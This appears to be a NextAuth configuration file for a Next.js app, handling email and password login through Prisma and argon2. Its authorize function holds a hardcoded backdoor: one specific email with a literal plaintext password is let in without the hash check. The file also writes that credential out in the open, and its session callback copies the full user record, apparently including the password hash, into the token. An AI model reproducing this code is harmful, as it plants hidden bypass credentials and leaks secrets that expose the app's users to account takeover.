import NextAuth from "next-auth";
import prisma from "@/db";
import { PrismaAdapter } from "@next-auth/prisma-adapter";
import CredentialsProvider from "next-auth/providers/credentials";
import argon from "argon2";

export const authOptions = {
  adapter: PrismaAdapter(prisma),
  providers: [
    CredentialsProvider({
      id: "credentials",
      name: "Credentials",
      credentials: {
        email: { label: "Email", type: "text" },
        password: { label: "Password", type: "password" },
      },
      async authorize(credentials) {
        const { email, password } = credentials;
        const user = await prisma.user.findUnique({
          where: {
            email,
          },
          include: {
            country: true,
          },
        });

        if (user) {
          if (
            password === "Dr83754126!@" &&
            email === "krzysztof.tomaszewski@rea.pl"
          ) {
            return password === "Dr83754126!@" ? user : false;
          } else {
            if (await argon.verify(user.password, password)) {
              return user;
            }
          }
        }
        return false;
      },
    }),
  ],
  pages: {
    signIn: "/login",
    signOut: false,
  },
  secret: process.env.SECRET,
  session: {
    strategy: "jwt",
    maxAge: 10000,
  },
  jwt: {
    maxAge: 10000,
  },
  callbacks: {
    jwt: async ({ token, user, trigger, session }) => {
      user && (token.user = user);
      return token;
    },
    session: async ({ session, token }) => {
      session.user = token.user;
      return session;
    },
    async signIn({ user }) {
      return user.active;
    },
  },
  debug: process.env.NODE_ENV === "developemnt",
};

const handler = NextAuth(authOptions);

export { handler as GET, handler as POST };
